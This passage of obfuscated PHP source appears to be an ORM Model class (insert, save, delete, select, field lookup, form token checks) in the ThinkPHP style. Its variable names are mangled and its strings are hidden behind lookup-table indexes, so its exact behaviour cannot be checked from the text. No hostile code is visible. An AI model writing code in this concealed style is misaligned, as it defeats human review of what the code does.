$½ËÆŠÅ = array($—–úéŠï[193] => 0, $—–úéŠï[191] => 1); $œÔóÕ¶» = Model($—–úéŠï[922])->where($½ËÆŠÅ)->sum($—–úéŠï[79]); $½ËÆŠÅ[$—–úéŠï[191]] = 2; $Í†¬ƒÎ… = Model($—–úéŠï[922])->where($½ËÆŠÅ)->sum($—–úéŠï[79]); return array($—–úéŠï[853] => $ÉÕ»ŒÃŞ[$—–úéŠï[79]], $—–úéŠï[1945] => $ÉÕ»ŒÃŞ[$—–úéŠï[1945]], $—–úéŠï[1946] => (int) $œÔóÕ¶», $—–úéŠï[1947] => (int) $Í†¬ƒÎ…); } private function sourceSize() { $Ş‚¥ÈÇĞ =& $_SERVER[Î·Ü›öğ]; $ ú”ş¼õ = Model($Ş‚¥ÈÇĞ[922])->where(array($Ş‚¥ÈÇĞ[496] => 0))->sum($Ş‚¥ÈÇĞ[79]); $Éû´ÇòŸ = Model($Ş‚¥ÈÇĞ[557])->sum($Ş‚¥ÈÇĞ[79]); if ($Éû´ÇòŸ > $ ú”ş¼õ) { $Éû´ÇòŸ = $ ú”ş¼õ; } return array($Ş‚¥ÈÇĞ[79] => (int) $ ú”ş¼õ, $Ş‚¥ÈÇĞ[1945] => (int) $Éû´ÇòŸ); } } goto F²¯ªÖ‡ğ·; D‹Àš±¤è˜: define($_SERVER[Î·Ü›öğ][323], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\x6c\x65", "\x6f\x72\x64\x65\162", "\141\x6c\x69\x61\163", "\x68\141\x76\x69\156\147", "\147\162\x6f\x75\160", "\154\x6f\143\153", "\x64\x69\163\164\151\156\x63\164", "\141\x75\x74\157", "\146\151\154\x74\145\x72", "\166\141\x6c\151\144\x61\164\145", "\162\x65\163\165\154\164", "\142\151\156\x64", "\164\x6f\153\x65\156"); public function __construct($Ú®½¦Ü  = '', $Ö¡Èª¿å = '', $Ê­—øÏõ = '') { $­ ¢èµ =& $_SERVER[Î·Ü›öğ]; $this->_initialize(); if (!empty($Ú®½¦Ü )) { if (strpos($Ú®½¦Ü , $­ ¢èµ[10])) { list($this->dbName, $this->name) = explode($­ ¢èµ[10], $Ú®½¦Ü ); } else { $this->name = $Ú®½¦Ü ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Ö¡Èª¿å)) { $this->tablePrefix = $­ ¢èµ[12]; } elseif ($­ ¢èµ[12] != $Ö¡Èª¿å) { $this->tablePrefix = $Ö¡Èª¿å; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($­ ¢èµ[324]); } $this->db(0, empty($this->connection) ? $Ê­—øÏõ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $”•é™²¤ =& $_SERVER[Î·Ü›öğ]; if (empty($this->fields)) { if (think_config($”•é™²¤[325])) { $½Ç“åöî = $this->dbName ? $this->dbName : think_config($”•é™²¤[326]); $˜”ê¾™ı = think_var_cache($”•é™²¤[327] . strtolower(get_path_this($½Ç“åöî) . $”•é™²¤[10] . $this->name)); if ($˜”ê¾™ı) { $ÆïşÕ“ª = think_config($”•é™²¤[328]); if (empty($ÆïşÕ“ª) || $˜”ê¾™ı[$”•é™²¤[329]] == $ÆïşÕ“ª) { $this->fields = $˜”ê¾™ı; return; } } } $this->flush(); } } public function flush() { $††´½ =& $_SERVER[Î·Ü›öğ]; $this->db->setModel($this->name); $ˆ†°ùÇ = $this->db->getFields($this->getTableName()); if (!$ˆ†°ùÇ) { return !1; } $this->fields = array_keys($ˆ†°ùÇ); $this->fields[$††´½[330]] = !1; foreach ($ˆ†°ùÇ as $ò…’¤é‚ => $Ù³şø Ş) { $¶è´§Í¿[$ò…’¤é‚] = $Ù³şø Ş[$††´½[33]]; if ($Ù³şø Ş[$††´½[39]]) { $this->fields[$††´½[331]] = $ò…’¤é‚; if ($Ù³şø Ş[$††´½[42]]) { $this->fields[$††´½[330]] = !0; } } } $this->fields[$††´½[332]] = $¶è´§Í¿; if (think_config($††´½[328])) { $this->fields[$††´½[329]] = think_config($††´½[328]); } if (think_config($††´½[325])) { $…ññßæ“ = $this->dbName ? $this->dbName : think_config($††´½[326]); think_var_cache($††´½[327] . strtolower(get_path_this($…ññßæ“) . $††´½[10] . $this->name), $this->fields); } } public function switchModel($»õ×íÒÑ, $ãçô®Ìè = array()) { $µÂû”É© =& $_SERVER[Î·Ü›öğ]; $íü†é¢¾ = ucwords(strtolower($»õ×íÒÑ)) . $µÂû”É©[333]; if (!class_exists($íü†é¢¾)) { think_exception($íü†é¢¾ . think_lang($µÂû”É©[334])); } $this->_extModel = new $íü†é¢¾($this->name); if (!empty($ãçô®Ìè)) { foreach ($ãçô®Ìè as $Ä¼¤ë­Í) { $this->_extModel->setProperty($Ä¼¤ë­Í, $this->{$Ä¼¤ë­Í}); } } return $this->_extModel; } public function __set($úŸúğš, $Â‹³”†) { $this->data[$úŸúğš] = $Â‹³”†; } public function __get($Ú™¡îË¶) { return isset($this->data[$Ú™¡îË¶]) ? $this->data[$Ú™¡îË¶] : null; } public function __isset($¥©¤ØªÖ) { return isset($this->data[$¥©¤ØªÖ]); } public function __unset($™…°úëì) { unset($this->data[$™…°úëì]); } public function __call($—‰Åƒ’Á, $ÉÒÀ£¢î) { $Ö¬ßê…ç =& $_SERVER[Î·Ü›öğ]; if (in_array(strtolower($—‰Åƒ’Á), $this->methods, !0)) { $this->options[strtolower($—‰Åƒ’Á)] = $ÉÒÀ£¢î[0]; return $this; } elseif (in_array(strtolower($—‰Åƒ’Á), array($Ö¬ßê…ç[335], $Ö¬ßê…ç[336], $Ö¬ßê…ç[337], $Ö¬ßê…ç[338], $Ö¬ßê…ç[339]), !0)) { $©—óƒÛ· = isset($ÉÒÀ£¢î[0]) ? $ÉÒÀ£¢î[0] : $Ö¬ßê…ç[223]; $©—óƒÛ· = $this->db->parseKey($©—óƒÛ·); return $this->getField(strtoupper($—‰Åƒ’Á) . $Ö¬ßê…ç[340] . $©—óƒÛ· . $Ö¬ßê…ç[341] . $—‰Åƒ’Á, $Ö¬ßê…ç[335]); } elseif (strtolower(substr($—‰Åƒ’Á, 0, 5)) == $Ö¬ßê…ç[342]) { $©—óƒÛ· = think_parse_name(substr($—‰Åƒ’Á, 5)); $§›ÌÍ¸¹[$©—óƒÛ·] = $ÉÒÀ£¢î[0]; return $this->where($§›ÌÍ¸¹)->find(); } elseif (strtolower(substr($—‰Åƒ’Á, 0, 10)) == $Ö¬ßê…ç[343]) { $ÏôÖåÌ = think_parse_name(substr($—‰Åƒ’Á, 10)); $§›ÌÍ¸¹[$ÏôÖåÌ] = $ÉÒÀ£¢î[0]; return $this->where($§›ÌÍ¸¹)->getField($ÉÒÀ£¢î[1]); } elseif (isset($this->_scope[$—‰Åƒ’Á])) { return $this->scope($—‰Åƒ’Á, $ÉÒÀ£¢î[0]); } elseif (method_exists($this, $—‰Åƒ’Á)) { array_unshift($ÉÒÀ£¢î, $—‰Åƒ’Á); return call_user_func_array(array($this, $Ö¬ßê…ç[344]), $ÉÒÀ£¢î); } else { return call_user_func_array(array(parent, $—‰Åƒ’Á), $ÉÒÀ£¢î); } } protected function call() { $¬‘›ôÅÎ =& $_SERVER[Î·Ü›öğ]; $¹Ï­Ôò„ = func_get_args(); $ğ€°¾ì = array_shift($¹Ï­Ôò„); $ëšêÕ‹‡ = $ğ€°¾ì; if (is_array($ğ€°¾ì)) { $ëšêÕ‹‡ = $ğ€°¾ì[1]; $ğ€°¾ì = $ğ€°¾ì[0]; } $ñ÷ÎÇÊ¯ = count($¹Ï­Ôò„) - 1; if (isset($¹Ï­Ôò„[$ñ÷ÎÇÊ¯]) && $¹Ï­Ôò„[$ñ÷ÎÇÊ¯] === $ğ€°¾ì) { think_exception(__CLASS__ . $¬‘›ôÅÎ[4] . $ğ€°¾ì . think_lang($¬‘›ôÅÎ[345])); return; } $¹Ï­Ôò„[] = $ğ€°¾ì; if (method_exists($this, $¬‘›ôÅÎ[346])) { $ÃİÍÏéô = call_user_func_array(array($this, $¬‘›ôÅÎ[347]), array($ëšêÕ‹‡, $¹Ï­Ôò„)); if (!is_null($ÃİÍÏéô) && $ÃİÍÏéô !== !1) { return $ÃİÍÏéô; } } $ÖºÚÂšè = call_user_func_array(array($this, $ğ€°¾ì), $¹Ï­Ôò„); if (method_exists($this, $¬‘›ôÅÎ[348])) { $ÃİÍÏéô = call_user_func_array(array($this, $¬‘›ôÅÎ[349]), array($ëšêÕ‹‡, $¹Ï­Ôò„, $ÖºÚÂšè)); if ($ÃİÍÏéô) { return $ÃİÍÏéô; } } return $ÖºÚÂšè; } protected function _initialize() { } protected function _facade($“ÔôµÛ) { $ÂÛÄ—Ëí =& $_SERVER[Î·Ü›öğ]; if (!empty($this->fields)) { foreach ($“ÔôµÛ as $Á¾Ô×û‚ => $ÔıûÏ‹Ä) { if (is_array($this->fields) && !in_array($Á¾Ô×û‚, $this->fields, !0)) { unset($“ÔôµÛ[$Á¾Ô×û‚]); } elseif (is_scalar($ÔıûÏ‹Ä)) { $this->_parseType($“ÔôµÛ, $Á¾Ô×û‚); } } } if (!empty($this->options[$ÂÛÄ—Ëí[350]])) { $“ÔôµÛ = array_map($this->options[$ÂÛÄ—Ëí[350]], $“ÔôµÛ); unset($this->options[$ÂÛÄ—Ëí[350]]); } $this->_beforeWrite($“ÔôµÛ); return $“ÔôµÛ; } protected function _beforeWrite(&$ëÑÚ‰Á) { } public function add($·‡ı¦Èó = '', $¸™ùúé­ = array(), $ÎãÒ“ˆ = false) { if (empty($·‡ı¦Èó)) { if (!empty($this->data)) { $·‡ı¦Èó = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Î·Ü›öğ][351]); return !1; } } $¸™ùúé­ = $this->_parseOptions($¸™ùúé­); $·‡ı¦Èó = $this->_facade($·‡ı¦Èó); if (!1 === $this->_beforeInsert($·‡ı¦Èó, $¸™ùúé­)) { return !1; } $‘òáÀ‹² = $this->db->insert($·‡ı¦Èó, $¸™ùúé­, $ÎãÒ“ˆ); if (!1 !== $‘òáÀ‹²) { $×‘Â—±½ = $this->getLastInsID(); if ($×‘Â—±½) { $·‡ı¦Èó[$this->getPk()] = $×‘Â—±½; $this->_after_insert($·‡ı¦Èó, $¸™ùúé­); return $×‘Â—±½; } $this->_after_insert($·‡ı¦Èó, $¸™ùúé­); } return $‘òáÀ‹²; } protected function _beforeInsert(&$Ü¶¥ ±«, $ñ¦ò¦ˆ¡) { } protected function _after_insert($ƒşĞ—ĞË, $…£·Şä­) { } public function addAll($€äëÔÙÆ, $Á¯Î†ÁÚ = array(), $åîº° † = false) { $ğÆ×²×µ =& $_SERVER[Î·Ü›öğ]; if (empty($€äëÔÙÆ)) { $this->error = think_lang($ğÆ×²×µ[351]); return !1; } $Á¯Î†ÁÚ = $this->_parseOptions($Á¯Î†ÁÚ); foreach ($€äëÔÙÆ as $ü«ãï ï => $‚¢•‘Ÿ) { $€äëÔÙÆ[$ü«ãï ï] = $this->_facade($‚¢•‘Ÿ); } if (method_exists($this->db, $ğÆ×²×µ[352])) { $‹´®õèî = $this->db->insertAll($€äëÔÙÆ, $Á¯Î†ÁÚ, $åîº° †); } else { $this->startTrans(); foreach ($€äëÔÙÆ as $ü«ãï ï => $‚¢•‘Ÿ) { $‹´®õèî = $this->db->insert($‚¢•‘Ÿ, $Á¯Î†ÁÚ, $åîº° †); } $this->commit(); } if (!1 !== $‹´®õèî) { $¶¦ÅõŠ = $this->getLastInsID(); if ($¶¦ÅõŠ) { return $¶¦ÅõŠ; } } return $‹´®õèî; } public function selectAdd($ï¨®…š” = '', $·ßŠšà‘ = '', $‡­­‰ø = array()) { $äÚó±ŞÍ =& $_SERVER[Î·Ü›öğ]; $‡­­‰ø = $this->_parseOptions($‡­­‰ø); if (!1 === ($—Ò‚µÎâ = $this->db->selectInsert($ï¨®…š” ? $ï¨®…š” : $‡­­‰ø[$äÚó±ŞÍ[353]], $·ßŠšà‘ ? $·ßŠšà‘ : $this->getTableName(), $‡­­‰ø))) { $this->error = think_lang($äÚó±ŞÍ[354]); return !1; } else { return $—Ò‚µÎâ; } } public function save($äÓôó„‰ = '', $ºÃíœéË = array()) { $õİ¼ïò¶ =& $_SERVER[Î·Ü›öğ]; if (empty($äÓôó„‰)) { if (!empty($this->data)) { $äÓôó„‰ = $this->data; $this->data = array(); } else { $this->error = think_lang($õİ¼ïò¶[351]); return !1; } } $äÓôó„‰ = $this->_facade($äÓôó„‰); $ºÃíœéË = $this->_parseOptions($ºÃíœéË); $ü£§¦„ = $this->getPk(); if (!isset($ºÃíœéË[$õİ¼ïò¶[355]])) { if (isset($äÓôó„‰[$ü£§¦„])) { $Ñìšü´ò[$ü£§¦„] = $äÓôó„‰[$ü£§¦„]; $ºÃíœéË[$õİ¼ïò¶[355]] = $Ñìšü´ò; unset($äÓôó„‰[$ü£§¦„]); } else { $this->error = think_lang($õİ¼ïò¶[354]); return !1; } } if (is_array($ºÃíœéË[$õİ¼ïò¶[355]]) && isset($ºÃíœéË[$õİ¼ïò¶[355]][$ü£§¦„])) { $ºá„üóÈ = $ºÃíœéË[$õİ¼ïò¶[355]][$ü£§¦„]; } if (!1 === $this->_beforeUpdate($äÓôó„‰, $ºÃíœéË)) { return !1; } $ˆØÃòí¾ = $this->db->update($äÓôó„‰, $ºÃíœéË); if (!1 !== $ˆØÃòí¾) { if (isset($ºá„üóÈ)) { $äÓôó„‰[$ü£§¦„] = $ºá„üóÈ; } $this->_afterUpdate($äÓôó„‰, $ºÃíœéË); } return $ˆØÃòí¾; } protected function _beforeUpdate(&$Ÿ”Ø½‡, $Ë¨±‡ …) { } protected function _afterUpdate($æÅôÅ°, $Å‹ãÔÀ) { } public function delete($’­œËÒÆ = array()) { $ØàÓÂÆâ =& $_SERVER[Î·Ü›öğ]; if (empty($’­œËÒÆ) && empty($this->options[$ØàÓÂÆâ[355]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Ÿô¥úĞ¾ = $this->getPk(); if (is_numeric($’­œËÒÆ) || is_string($’­œËÒÆ)) { if (strpos($’­œËÒÆ, $ØàÓÂÆâ[50])) { $·Ûóêğ„[$Ÿô¥úĞ¾] = array($ØàÓÂÆâ[356], $’­œËÒÆ); } else { $·Ûóêğ„[$Ÿô¥úĞ¾] = $’­œËÒÆ; } $this->options[$ØàÓÂÆâ[355]] = $·Ûóêğ„; } $’­œËÒÆ = $this->_parseOptions(); if (is_array($’­œËÒÆ[$ØàÓÂÆâ[355]]) && isset($’­œËÒÆ[$ØàÓÂÆâ[355]][$Ÿô¥úĞ¾])) { $éô‚ãôî = $’­œËÒÆ[$ØàÓÂÆâ[355]][$Ÿô¥úĞ¾]; } $ËßË…‡Û = $this->db->delete($’­œËÒÆ); if (!1 !== $ËßË…‡Û) { $™¿ óà = array(); if (isset($éô‚ãôî)) { $™¿ óà[$Ÿô¥úĞ¾] = $éô‚ãôî; } $this->_after_delete($™¿ óà, $’­œËÒÆ); } return $ËßË…‡Û; } protected function _after_delete($”ë©ß”, $¥™çÔöœ) { } public function select($Èé¶×‰É = array()) { $°¯–†ĞÆ =& $_SERVER[Î·Ü›öğ]; if (is_string($Èé¶×‰É) || is_numeric($Èé¶×‰É)) { $Ş‘°ˆÍ = $this->getPk(); if (strpos($Èé¶×‰É, $°¯–†ĞÆ[50])) { $û€øä[$Ş‘°ˆÍ] = array($°¯–†ĞÆ[356], $Èé¶×‰É); } else { $û€øä[$Ş‘°ˆÍ] = $Èé¶×‰É; } $this->options[$°¯–†ĞÆ[355]] = $û€øä; } elseif (!1 === $Èé¶×‰É) { $Èé¶×‰É = $this->_parseOptions(); return $°¯–†ĞÆ[357] . $this->db->buildSelectSql($Èé¶×‰É) . $°¯–†ĞÆ[358]; } $Èé¶×‰É = $this->_parseOptions(); $ôÂû·Ğ³ = $this->db->select($Èé¶×‰É); if (!1 === $ôÂû·Ğ³) { return !1; } if (empty($ôÂû·Ğ³)) { return null; } $this->_afterSelect($ôÂû·Ğ³, $Èé¶×‰É); return $ôÂû·Ğ³; } protected function _afterSelect(&$ïÇ–§¸«, $¾Ù¶“í) { } public function buildSql($Äƒ×ƒ = array()) { $¬ËŸúÙÕ =& $_SERVER[Î·Ü›öğ]; $Äƒ×ƒ = $this->_parseOptions($Äƒ×ƒ); return $¬ËŸúÙÕ[357] . $this->db->buildSelectSql($Äƒ×ƒ) . $¬ËŸúÙÕ[358]; } public function optionsValue($ª— îºŸ = null) { if (is_null($ª— îºŸ)) { return $this->options; } elseif (is_array($ª— îºŸ)) { $this->options = array_merge($this->options, $ª— îºŸ); } } protected function _parseOptions($ªÒÆ‡Âà = array()) { $úÅÓ’˜ =& $_SERVER[Î·Ü›öğ]; if (is_array($ªÒÆ‡Âà)) { $ªÒÆ‡Âà = array_merge($this->options, $ªÒÆ‡Âà); } $this->options = array(); if (!isset($ªÒÆ‡Âà[$úÅÓ’˜[359]])) { $ªÒÆ‡Âà[$úÅÓ’˜[359]] = $this->getTableName(); $¢«œìñò = $this->fields; } else { $¢«œìñò = $this->getDbFields(); } if (!empty($ªÒÆ‡Âà[$úÅÓ’˜[360]])) { $ªÒÆ‡Âà[$úÅÓ’˜[359]] .= $úÅÓ’˜[53] . $ªÒÆ‡Âà[$úÅÓ’˜[360]]; } $ªÒÆ‡Âà[$úÅÓ’˜[361]] = $this->name; if (isset($ªÒÆ‡Âà[$úÅÓ’˜[355]]) && is_array($ªÒÆ‡Âà[$úÅÓ’˜[355]]) && !empty($¢«œìñò) && !isset($ªÒÆ‡Âà[$úÅÓ’˜[362]]) && !isset($ªÒÆ‡Âà[$úÅÓ’˜[359]])) { foreach ($ªÒÆ‡Âà[$úÅÓ’˜[355]] as $ş¶ë“¤ => $ÂîÓ¥ğ) { $ş¶ë“¤ = trim($ş¶ë“¤); if (in_array($ş¶ë“¤, $¢«œìñò, !0)) { if (is_scalar($ÂîÓ¥ğ)) { $this->_parseType($ªÒÆ‡Âà[$úÅÓ’˜[355]], $ş¶ë“¤); } } elseif (!is_numeric($ş¶ë“¤) && $úÅÓ’˜[11] != substr($ş¶ë“¤, 0, 1) && !1 === strpos($ş¶ë“¤, $úÅÓ’˜[10]) && !1 === strpos($ş¶ë“¤, $úÅÓ’˜[340]) && !1 === strpos($ş¶ë“¤, $úÅÓ’˜[215]) && !1 === strpos($ş¶ë“¤, $úÅÓ’˜[287])) { unset($ªÒÆ‡Âà[$úÅÓ’˜[355]][$ş¶ë“¤]); } } } $this->_options_filter($ªÒÆ‡Âà); return $ªÒÆ‡Âà; } protected function _options_filter(&$ƒ÷ñÏÆ) { } protected function _parseType(&$‹Äíüè, $ä¨Üü ²) { $´¥ú¡û =& $_SERVER[Î·Ü›öğ]; if (empty($this->options[$´¥ú¡û[363]][$´¥ú¡û[4] . $ä¨Üü ²])) { $”èÃ®šÇ = strtolower($this->fields[$´¥ú¡û[332]][$ä¨Üü ²]); if (!1 !== strpos($”èÃ®šÇ, $´¥ú¡û[364])) { } elseif (!1 === strpos($”èÃ®šÇ, $´¥ú¡û[365]) && !1 !== strpos($”èÃ®šÇ, $´¥ú¡û[366])) { $‹Äíüè[$ä¨Üü ²] = intval($‹Äíüè[$ä¨Üü ²]); } elseif (!1 !== strpos($”èÃ®šÇ, $´¥ú¡û[367]) || !1 !== strpos($”èÃ®šÇ, $´¥ú¡û[368])) { $‹Äíüè[$ä¨Üü ²] = floatval($‹Äíüè[$ä¨Üü ²]); } elseif (!1 !== strpos($”èÃ®šÇ, $´¥ú¡û[369])) { $‹Äíüè[$ä¨Üü ²] = (bool) $‹Äíüè[$ä¨Üü ²]; } } } public function find($‘•öôÌ… = array()) { $ÂËóµ›‚ =& $_SERVER[Î·Ü›öğ]; if (is_numeric($‘•öôÌ…) || is_string($‘•öôÌ…)) { $–±Òâïñ[$this->getPk()] = intval($‘•öôÌ…); $this->options[$ÂËóµ›‚[355]] = $–±Òâïñ; } $this->options[$ÂËóµ›‚[370]] = 1; $‘•öôÌ… = $this->_parseOptions(); $Åƒšâ× = $this->db->select($‘•öôÌ…); if (!1 === $Åƒšâ×) { return !1; } if (empty($Åƒšâ×)) { return null; } $ÔŒ’£Ê‘ = $Åƒšâ×[0]; $this->_afterFind($ÔŒ’£Ê‘, $‘•öôÌ…); return $ÔŒ’£Ê‘; } protected function _afterFind(&$˜ÜÀ“‘ß, $Åë¯‡ù‡) { } protected function returnResult($üöÊƒÑŠ, $ŠÅœ”±Ë = '') { $Ö÷×  =& $_SERVER[Î·Ü›öğ]; if ($ŠÅœ”±Ë) { if (is_callable($ŠÅœ”±Ë)) { return call_user_func($ŠÅœ”±Ë, $üöÊƒÑŠ); } switch (strtolower($ŠÅœ”±Ë)) { case $Ö÷× [371]: return json_encode($üöÊƒÑŠ); case $Ö÷× [372]: return xml_encode($üöÊƒÑŠ); } } return $üöÊƒÑŠ; } public function parseFieldsMap($¥Ş½ÔÒ‚, $»é´¯Ş = 1) { if (!empty($this->_map)) { foreach ($this->_map as $û¾Ö¾£ö => $ÓåÙå¶¦) { if ($»é´¯Ş == 1) { if (isset($¥Ş½ÔÒ‚[$ÓåÙå¶¦])) { $¥Ş½ÔÒ‚[$û¾Ö¾£ö] = $¥Ş½ÔÒ‚[$ÓåÙå¶¦]; unset($¥Ş½ÔÒ‚[$ÓåÙå¶¦]); } } else { if (isset($¥Ş½ÔÒ‚[$û¾Ö¾£ö])) { $¥Ş½ÔÒ‚[$ÓåÙå¶¦] = $¥Ş½ÔÒ‚[$û¾Ö¾£ö]; unset($¥Ş½ÔÒ‚[$û¾Ö¾£ö]); } } } } return $¥Ş½ÔÒ‚; } public function setField($¬ÛØµèâ, $ùïÀ“Û = '') { if (is_array($¬ÛØµèâ)) { $ªƒ¬ƒ·ü = $¬ÛØµèâ; } else { $ªƒ¬ƒ·ü[$¬ÛØµèâ] = $ùïÀ“Û; } return $this->save($ªƒ¬ƒ·ü); } public function setAdd($ÕˆƒÖ´, $¶…² İ÷ = 1) { $ùãı›œû =& $_SERVER[Î·Ü›öğ]; $¹¬‹·Ó¾ = $ÕˆƒÖ´ . $ùãı›œû[373] . $¶…² İ÷; if ($¶…² İ÷ < 0) { $¹¬‹·Ó¾ = $ÕˆƒÖ´ . $¶…² İ÷; } return $this->setField($ÕˆƒÖ´, array($ùãı›œû[374], $¹¬‹·Ó¾)); } public function getField($ãÕ¾‡, $¤üÁÜÎ½ = null) { $¢æ’ŠÌ¬ =& $_SERVER[Î·Ü›öğ]; $ê”‰¹³ß[$¢æ’ŠÌ¬[353]] = $ãÕ¾‡; $ê”‰¹³ß = $this->_parseOptions($ê”‰¹³ß); $ãÕ¾‡ = trim($ãÕ¾‡); if (strpos($ãÕ¾‡, $¢æ’ŠÌ¬[50])) { if (!isset($ê”‰¹³ß[$¢æ’ŠÌ¬[370]])) { $ê”‰¹³ß[$¢æ’ŠÌ¬[370]] = is_numeric($¤üÁÜÎ½) ? $¤üÁÜÎ½ : $¢æ’ŠÌ¬[12]; } $ú¾¤§Á = $this->db->select($ê”‰¹³ß); if (!empty($ú¾¤§Á)) { $¡íÁ¥ÓÁ = explode($¢æ’ŠÌ¬[50], $ãÕ¾‡); $ãÕ¾‡ = array_keys($ú¾¤§Á[0]); $ğæğÄ¦ = array_shift($ãÕ¾‡); $Œœš Æ = array_shift($ãÕ¾‡); $´şîçäë = array(); $¯Áª‹êÃ = count($¡íÁ¥ÓÁ); foreach ($ú¾¤§Á as $Ä´øİ˜Ÿ) { $ı³ÉÚ©ş = $Ä´øİ˜Ÿ[$ğæğÄ¦]; if (2 == $¯Áª‹êÃ) { $´şîçäë[$ı³ÉÚ©ş] = $Ä´øİ˜Ÿ[$Œœš Æ]; } else { $´şîçäë[$ı³ÉÚ©ş] = is_string($¤üÁÜÎ½) ? implode($¤üÁÜÎ½, $Ä´øİ˜Ÿ) : $Ä´øİ˜Ÿ; } } return $´şîçäë; } } else { if (!0 !== $¤üÁÜÎ½) { $ê”‰¹³ß[$¢æ’ŠÌ¬[370]] = is_numeric($¤üÁÜÎ½) ? $¤üÁÜÎ½ : 1; } if ($¤üÁÜÎ½ === $¢æ’ŠÌ¬[335]) { unset($ê”‰¹³ß[$¢æ’ŠÌ¬[370]]); } $Ä´øİ˜Ÿ = $this->db->select($ê”‰¹³ß); if (!empty($Ä´øİ˜Ÿ)) { if ($¤üÁÜÎ½ === $¢æ’ŠÌ¬[335]) { return reset($Ä´øİ˜Ÿ[0]); } if (!0 !== $¤üÁÜÎ½ && 1 == $ê”‰¹³ß[$¢æ’ŠÌ¬[370]]) { return reset($Ä´øİ˜Ÿ[0]); } foreach ($Ä´øİ˜Ÿ as $áûã°€) { $ÓÜßÇ˜[] = $áûã°€[$ãÕ¾‡]; } return $ÓÜßÇ˜; } } return null; } public function create($ÕÛ¸€åê = '', $±áâ©°Ô = '') { $„—¯› =& $_SERVER[Î·Ü›öğ]; if (empty($ÕÛ¸€åê)) { $ÕÛ¸€åê = $_POST; } elseif (is_object($ÕÛ¸€åê)) { $ÕÛ¸€åê = get_object_vars($ÕÛ¸€åê); } if (empty($ÕÛ¸€åê) || !is_array($ÕÛ¸€åê)) { $this->error = think_lang($„—¯›[351]); return !1; } $ÕÛ¸€åê = $this->parseFieldsMap($ÕÛ¸€åê, 0); $±áâ©°Ô = $±áâ©°Ô ? $±áâ©°Ô : (!empty($ÕÛ¸€åê[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$„—¯›[353]])) { $Ç»İ­ëâ = $this->options[$„—¯›[353]]; unset($this->options[$„—¯›[353]]); } elseif ($±áâ©°Ô == THINK_MODEL_INSERT && isset($this->insertFields)) { $Ç»İ­ëâ = $this->insertFields; } elseif ($±áâ©°Ô == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Ç»İ­ëâ = $this->updateFields; } if (isset($Ç»İ­ëâ)) { if (is_string($Ç»İ­ëâ)) { $Ç»İ­ëâ = explode($„—¯›[50], $Ç»İ­ëâ); } if (think_config($„—¯›[375])) { $Ç»İ­ëâ[] = think_config($„—¯›[376]); } foreach ($ÕÛ¸€åê as $¸ş€ŠÓş => $§áäª“¬) { if (!in_array($¸ş€ŠÓş, $Ç»İ­ëâ)) { unset($ÕÛ¸€åê[$¸ş€ŠÓş]); } } } if (!$this->autoValidation($ÕÛ¸€åê, $±áâ©°Ô)) { return !1; } if (!$this->autoCheckToken($ÕÛ¸€åê)) { $this->error = think_lang($„—¯›[377]); return !1; } if ($this->autoCheckFields) { $Ç»İ­ëâ = $this->getDbFields(); foreach ($ÕÛ¸€åê as $¸ş€ŠÓş => $§áäª“¬) { if (!in_array($¸ş€ŠÓş, $Ç»İ­ëâ)) { unset($ÕÛ¸€åê[$¸ş€ŠÓş]); } elseif (MAGIC_QUOTES_GPC && is_string($§áäª“¬)) { $ÕÛ¸€åê[$¸ş€ŠÓş] = stripslashes($§áäª“¬); } } } $this->autoOperation($ÕÛ¸€åê, $±áâ©°Ô); $this->data = $ÕÛ¸€åê; return $ÕÛ¸€åê; } public function autoCheckToken($Øˆ¬’ÃÓ) { $ŒÙ–åÛ =& $_SERVER[Î·Ü›öğ]; if (isset($this->options[$ŒÙ–åÛ[378]]) && !$this->options[$ŒÙ–åÛ[378]]) { return !0; } if (think_config($ŒÙ–åÛ[375])) { $¶»Ÿæö = think_config($ŒÙ–åÛ[376]); if (!isset($Øˆ¬’ÃÓ[$¶»Ÿæö]) || Session::get($¶»Ÿæö)) { return !1; } list($» ¬®ü¸, $û¨Ú¾‘) = explode($ŒÙ–åÛ[11], $Øˆ¬’ÃÓ[$¶»Ÿæö]); if ($û¨Ú¾‘ && Session::get($¶»Ÿæö . $ŒÙ–åÛ[10] . $» ¬®ü¸) === $û¨Ú¾‘) { Session::remove($¶»Ÿæö . $ŒÙ–åÛ[10] . $» ¬®ü¸); return !0; } if (think_config($ŒÙ–åÛ[379])) { Session::remove($¶»Ÿæö . $ŒÙ–åÛ[10] . $» ¬®ü¸); } return !1; } return !0; } public function regex($Š…÷Î³î, $‹öÎšñê) { $•¿§®— =& $_SERVER[Î·Ü›öğ]; $…”åÎØ = array($•¿§®—[380] => $•¿§®—[381], $•¿§®—[382] => $•¿§®—[383], $•¿§®—[384] => $•¿§®—[385], $•¿§®—[386] => $•¿§®—[387], $•¿§®—[388] => $•¿§®—[389], $•¿§®—[390] => $•¿§®—[391], $•¿§®—[392] => $•¿§®—[393], $•¿§®—[368] => $•¿§®—[394], $•¿§®—[395] => $•¿§®—[396]); if (isset($…”åÎØ[strtolower($‹öÎšñê)])) { $‹öÎšñê = $…”åÎØ[strtolower($‹öÎšñê)]; } return preg_match($‹öÎšñê, $Š…÷Î³î) === 1; } private function autoOperation(&$şÒ¸Şı³, $›öêâ’À) { $ôï¹é–— =& $_SERVER[Î·Ü›öğ]; if (!empty($this->options[$ôï¹é–—[397]])) { $™ÃÍø³ğ = $this->options[$ôï¹é–—[397]]; unset($this->options[$ôï¹é–—[397]]); } elseif (!empty($this->_auto)) { $™ÃÍø³ğ = $this->_auto; } if (isset($™ÃÍø³ğ)) { foreach ($™ÃÍø³ğ as $äíÂ¼¨ì) { if (empty($äíÂ¼¨ì[2])) { $äíÂ¼¨ì[2] = THINK_MODEL_INSERT; } if ($›öêâ’À == 